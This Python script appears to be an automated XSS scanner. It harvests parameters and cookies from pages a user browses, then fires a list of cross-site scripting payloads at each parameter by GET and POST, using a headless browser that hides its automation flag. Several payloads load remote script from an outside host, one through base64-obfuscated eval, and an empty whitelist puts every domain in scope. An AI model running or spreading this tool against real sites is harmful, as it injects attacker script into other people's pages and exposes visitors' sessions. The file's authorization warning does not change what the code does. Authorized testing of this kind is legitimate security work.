from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.alert import Alert
import time
import re
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import os
import json
import threading
import queue
import random
import logging
import sys
from concurrent.futures import ThreadPoolExecutor
import requests  # Added for rate limiting checks

# Configure logging for the script
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', force=True)
print("Script starting...")

# File constants
PARAMETERS_OUTPUT_FILE = "collected_parameters.json"
COOKIES_OUTPUT_FILE = "collected_cookies.json"
XSS_RESULTS_FILE = "xss_results.json"
XSS_ALERTS_FILE = "xss_alerts.json"
STATE_FILE = "tested_params.json"  # Added for session persistence

# XSS Payloads
PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    'javascript:alert("xss")',
    '";alert("xss");',
    '%3Cscript%3Ealert("xss")%3C/script%3E',
    '<svg onload=alert("xss")>',
    '\'"><script src="https://js.rip/shootweb"></script>',
    '<script src="https://js.rip/shootweb"></script>',
    "\"><img src=https://google.com/ThisSourceIsNotReal id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL21mNGNqZWJvNjkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>",
    "<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"https://js.rip/shootweb\");a.send();</script>",
    "-->'\"/></sCript><svG x=\">\" onload=(co\u006efirm)``>",
    "<svg%0Ao%00nload=%09((pro\u006dpt))()//",
    "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">"
]

class LiveXSSTester:
    def __init__(self, config_path="config.json"):
        self.driver = None
        self.test_driver = None
        self.param_queue = queue.Queue()
        self.collected_params = set()
        self.processed_param_names = set()
        self.current_domain = None
        self.vulnerabilities_found = 0  # Track vulnerabilities
        self.config = self.load_config(config_path)
        self.whitelist = self.config.get("whitelist", [])  # Domain whitelist
        self.max_threads = self.config.get("max_threads", 3)
        self.delay_range = self.config.get("delay_range", [0.2, 0.3])
        self.load_state()  # Load persisted state
        print("LiveXSSTester initialized")

    def load_config(self, config_path):
        default_config = {
            "whitelist": [],  # e.g., ["example.com", "test.com"]
            "max_threads": 3,
            "delay_range": [0.2, 0.3]
        }
        if os.path.exists(config_path):
            with open(config_path, "r") as f:
                config = json.load(f)
            default_config.update(config)
        return default_config

    def save_state(self):
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(list(self.processed_param_names), f)
        logging.info(f"State saved to {STATE_FILE}")

    def load_state(self):
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                self.processed_param_names = set(json.load(f))
            logging.info(f"State loaded from {STATE_FILE}")

    def append_to_file(self, data, filename=PARAMETERS_OUTPUT_FILE):
        with open(filename, "a", encoding="utf-8") as f:
            f.write("# Generated by ParamSpyV0.4. For authorized pentesting only.\n")
            json.dump(data, f)
            f.write("\n")

    def save_cookies_to_file(self, cookies, filename=COOKIES_OUTPUT_FILE):
        cookie_dict = {cookie["name"]: cookie["value"] for cookie in cookies}
        with open(filename, "w", encoding="utf-8") as f:
            f.write("# Generated by ParamSpyV0.4. For authorized pentesting only.\n")
            json.dump(cookie_dict, f, indent=4)
        logging.info(f"Cookies saved to {filename}")
        return cookie_dict

    def is_in_scope(self, url):
        if not self.whitelist:
            return True  # No whitelist means all domains allowed (for testing)
        domain = urlparse(url).netloc
        return any(whitelisted in domain for whitelisted in self.whitelist)

    def extract_url_parameters(self, url):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        # Extract parameters from URL fragment
        fragment_params = parse_qs(parsed_url.fragment)
        return set(query_params.keys()) | set(fragment_params.keys())

    def extract_page_parameters(self):
        params = set()
        soup = BeautifulSoup(self.driver.page_source, "html.parser")
        # Extract form inputs
        for tag in soup.find_all(["input", "textarea", "select"]):
            param_name = tag.get("name")
            if param_name and self.is_valid_parameter(param_name):
                params.add(param_name)
        for hidden in soup.find_all("input", type="hidden"):
            param_name = hidden.get("name")
            if param_name and self.is_valid_parameter(param_name):
                params.add(param_name)
        # Extract URL parameters from links
        for link in soup.find_all("a", href=True):
            parsed_url = urlparse(link["href"])
            query_params = parse_qs(parsed_url.query)
            params.update(query_params.keys())
        # Extract parameters from AJAX/fetch requests
        ajax_params = self.extract_ajax_parameters()
        params.update(ajax_params)
        return params

    def extract_ajax_parameters(self):
        try:
            # Capture network requests
            network_requests = self.driver.execute_script("""
                return performance.getEntriesByType('resource')
                    .filter(e => e.initiatorType === 'xmlhttprequest' || e.initiatorType === 'fetch')
                    .map(e => e.name);
            """)
            params = set()
            for url in network_requests:
                query_params = parse_qs(urlparse(url).query)
                params.update(query_params.keys())
            return params
        except Exception as e:
            logging.warning(f"Error extracting AJAX parameters: {e}")
            return set()

    def extract_cookies(self):
        return self.driver.get_cookies()

    def is_valid_parameter(self, param_name):
        if not param_name:
            return False
        # Allow more complex parameter names, log exclusions
        if re.match(r'.*\[.*\]', param_name):
            logging.debug(f"Excluded parameter due to format: {param_name}")
            return False
        return not param_name.startswith('_')

    def setup_navigation_driver(self):
        print("Setting up navigation driver...")
        chrome_options = Options()
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_argument("--disable-webrtc")
        chrome_options.add_argument("--disable-features=WebRtcHideLocalIpsWithMdns")
        chrome_options.add_argument("--log-level=3")
        service = Service(log_path=os.devnull)
        for attempt in range(3):
            try:
                self.driver = webdriver.Chrome(options=chrome_options, service=service)
                print("Navigation driver setup complete")
                return
            except Exception as e:
                logging.warning(f"Navigation driver setup failed (attempt {attempt+1}/3): {e}")
                time.sleep(2)
        logging.error("Failed to setup navigation driver after retries")
        sys.exit(1)

    def setup_test_driver(self):
        print("Setting up test driver...")
        chrome_options = Options()
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--headless")  # Run test driver in headless mode
        chrome_options.add_argument("--enable-unsafe-swiftshader")
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--disable-webrtc")
        chrome_options.add_argument("--disable-features=WebRtcHideLocalIpsWithMdns")
        chrome_options.add_argument("--log-level=3")
        service = Service(log_path=os.devnull)
        for attempt in range(3):
            try:
                self.test_driver = webdriver.Chrome(options=chrome_options, service=service)
                self.test_driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
                print("Test driver setup complete")
                return
            except Exception as e:
                logging.warning(f"Test driver setup failed (attempt {attempt+1}/3): {e}")
                time.sleep(2)
        logging.error("Failed to setup test driver after retries")
        sys.exit(1)

    def sync_test_driver_cookies(self, domain=None):
        cookies = self.extract_cookies()
        if cookies:
            try:
                target_domain = domain or self.current_domain or "about:blank"
                self.test_driver.get(target_domain)
                self.test_driver.delete_all_cookies()
                for cookie in cookies:
                    try:
                        self.test_driver.add_cookie(cookie)
                    except Exception as e:
                        logging.warning(f"Failed to add cookie {cookie['name']} for {target_domain}: {e}")
                logging.info(f"Cookies synced to test driver for {target_domain}")
            except Exception as e:
                logging.error(f"Error syncing cookies to test driver: {e}")

    def check_and_handle_alert(self, method, url, payload):
        for _ in range(3):
            try:
                alert = Alert(self.test_driver)
                alert_text = alert.text
                alert.accept()
                return alert_text
            except:
                time.sleep(1)
        return None

    def check_for_xss(self, method, url, payload):
        alert_text = self.check_and_handle_alert(method, url, payload)
        network_requests = self.test_driver.execute_script("""
            return performance.getEntriesByType('resource').map(e => e.name);
        """)
        xss_detected = any("js.rip" in req for req in network_requests)
        soup = BeautifulSoup(self.test_driver.page_source, "html.parser")
        dom_reflection = payload in self.test_driver.page_source
        if alert_text or xss_detected or dom_reflection:
            self.vulnerabilities_found += 1
            with open(XSS_ALERTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "method": method,
                    "url": url,
                    "payload": payload,
                    "alert_text": alert_text,
                    "network_triggered": xss_detected,
                    "dom_reflection": dom_reflection,
                    "status_code": self.test_driver.execute_script("return document.readyState === 'complete' ? 200 : 0"),
                    "timestamp": time.time()
                }) + "\n")
            return True
        return False

    def fetch_page_content_selenium_get(self, url, payload):
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 429:
                logging.warning("Rate limit detected, increasing delay")
                self.delay_range = [d * 2 for d in self.delay_range]
            self.test_driver.get(url)
            WebDriverWait(self.test_driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            self.check_for_xss("GET", url, payload)
            return self.test_driver.page_source
        except Exception as e:
            logging.error(f"Error fetching GET {url}: {e}")
            return None

    def fetch_page_content_selenium_post(self, url, param_name, payload):
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 429:
                logging.warning("Rate limit detected, increasing delay")
                self.delay_range = [d * 2 for d in self.delay_range]
            self.test_driver.get(url)
            soup = BeautifulSoup(self.test_driver.page_source, "html.parser")
            form = soup.find("form", {"method": re.compile("post", re.I)})
            if form and form.get("action"):
                action_url = urljoin(url, form["action"])
                inputs = form.find_all("input", {"name": True})
                script = f"document.body.innerHTML = '<form id=\"xssForm\" method=\"POST\" action=\"{action_url}\">"
                for inp in inputs:
                    name = inp["name"]
                    value = payload if name == param_name else inp.get("value", "")
                    script += f'<input name="{name}" value="{value}">'
                script += "</form>; document.getElementById('xssForm').submit();"
            else:
                script = f"""
                document.body.innerHTML = '<form id="xssForm" method="POST" action="{url}"><input name="{param_name}" value="{payload}"></form>';
                document.getElementById('xssForm').submit();
                """
            self.test_driver.execute_script(script)
            WebDriverWait(self.test_driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'body')))
            self.check_for_xss("POST", f"{url}?{param_name}={payload}", payload)
            return self.test_driver.page_source
        except Exception as e:
            logging.error(f"Error fetching POST {url} with {param_name}={payload}: {e}")
            return None

    def test_xss_combination(self, target_url, payloads):
        if not self.is_in_scope(target_url):
            logging.warning(f"URL {target_url} is out of scope, skipping")
            return
        param_name = target_url.split('?')[-1].rstrip('=')
        base_url = target_url.split('?')[0]
        domain = urlparse(base_url).scheme + "://" + urlparse(base_url).netloc
        self.sync_test_driver_cookies(domain)

        for payload in payloads:
            get_combination = f"{target_url}{payload}"
            logging.info(f"Testing GET: {get_combination}")
            self.fetch_page_content_selenium_get(get_combination, payload)
            with open(XSS_RESULTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({"method": "GET", "url": get_combination, "timestamp": time.time()}) + "\n")

            logging.info(f"Testing POST: {base_url} with {param_name}={payload}")
            self.fetch_page_content_selenium_post(base_url, param_name, payload)
            with open(XSS_RESULTS_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps({"method": "POST", "url": f"{base_url}?{param_name}={payload}", "timestamp": time.time()}) + "\n")

            delay = random.uniform(self.delay_range[0], self.delay_range[1])
            time.sleep(delay)

    def xss_testing_thread(self):
        self.setup_test_driver()
        self.sync_test_driver_cookies()
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while True:
                try:
                    target_url = self.param_queue.get(timeout=1)
                    executor.submit(self.test_xss_combination, target_url, PAYLOADS)
                    self.param_queue.task_done()
                except queue.Empty:
                    time.sleep(0.1)
                except Exception as e:
                    logging.error(f"Testing thread error: {e}")

    def cleanup_drivers(self):
        if self.driver:
            self.driver.delete_all_cookies()
            self.driver.quit()
            self.driver = None
        if self.test_driver:
            self.test_driver.delete_all_cookies()
            self.test_driver.quit()
            self.test_driver = None
        logging.info("Drivers cleaned up")

    def monitor_and_test(self):
        for filename in [PARAMETERS_OUTPUT_FILE, COOKIES_OUTPUT_FILE, XSS_RESULTS_FILE, XSS_ALERTS_FILE]:
            if os.path.exists(filename):
                os.remove(filename)

        print("WARNING: Ensure you have permission to test the target site. Unauthorized testing is illegal.")
        if input("Continue? (y/n): ").lower() != 'y':
            sys.exit(0)

        self.setup_navigation_driver()
        logging.info("Browser is open. Navigate as you wish. Press Ctrl+C to stop.")
        logging.info(f"Parameters saved to {PARAMETERS_OUTPUT_FILE}")
        logging.info(f"Cookies saved to {COOKIES_OUTPUT_FILE}")
        logging.info(f"XSS results saved to {XSS_RESULTS_FILE}")
        logging.info(f"XSS alerts saved to {XSS_ALERTS_FILE}")

        test_thread = threading.Thread(target=self.xss_testing_thread, daemon=True)
        test_thread.start()

        last_url = ""
        last_cookies = set()

        try:
            while True:
                current_url = self.driver.current_url
                if current_url != last_url:
                    if not self.is_in_scope(current_url):
                        logging.warning(f"URL {current_url} is out of scope, skipping parameter collection")
                        continue
                    logging.info(f"Processing: {current_url}")
                    last_url = current_url
                    base_url = urlparse(current_url).scheme + "://" + urlparse(current_url).netloc + urlparse(current_url).path

                    url_params = self.extract_url_parameters(current_url)
                    page_params = self.extract_page_parameters()
                    cookie_params = {cookie["name"] for cookie in self.extract_cookies()}

                    all_params = url_params | page_params | cookie_params
                    all_params = {p for p in all_params if p and self.is_valid_parameter(p)}

                    for param in all_params:
                        formatted_output = f"{base_url}?{param}="
                        if formatted_output not in self.collected_params:
                            self.append_to_file({"url": formatted_output, "timestamp": time.time()})
                            self.collected_params.add(formatted_output)
                            logging.info(f"New parameter found: {formatted_output}")
                        if param not in self.processed_param_names:
                            self.param_queue.put(formatted_output)
                            self.processed_param_names.add(param)
                            self.save_state()  # Save state after adding new parameter
                            logging.info(f"Parameter {param} queued for testing at: {formatted_output}")

                current_cookies = self.extract_cookies()
                current_cookie_names = {cookie["name"] for cookie in current_cookies}
                if current_cookie_names != last_cookies:
                    self.save_cookies_to_file(current_cookies)
                    self.sync_test_driver_cookies()
                    last_cookies = current_cookie_names

                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Stopping script...")
        finally:
            self.cleanup_drivers()
            with open("xss_summary.json", "w", encoding="utf-8") as f:
                json.dump({
                    "total_parameters": len(self.collected_params),
                    "tested_parameters": len(self.processed_param_names),
                    "vulnerabilities_found": self.vulnerabilities_found,
                    "recommendations": ["Sanitize inputs", "Implement CSP", "Escape user data"]
                }, f, indent=4)
            logging.info("Summary report generated at xss_summary.json")
            print("Script terminated")

def main():
    print("Entering main...")
    try:
        tester = LiveXSSTester()
        tester.monitor_and_test()
    except Exception as e:
        print(f"Error in main: {e}")
        logging.error(f"Error in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
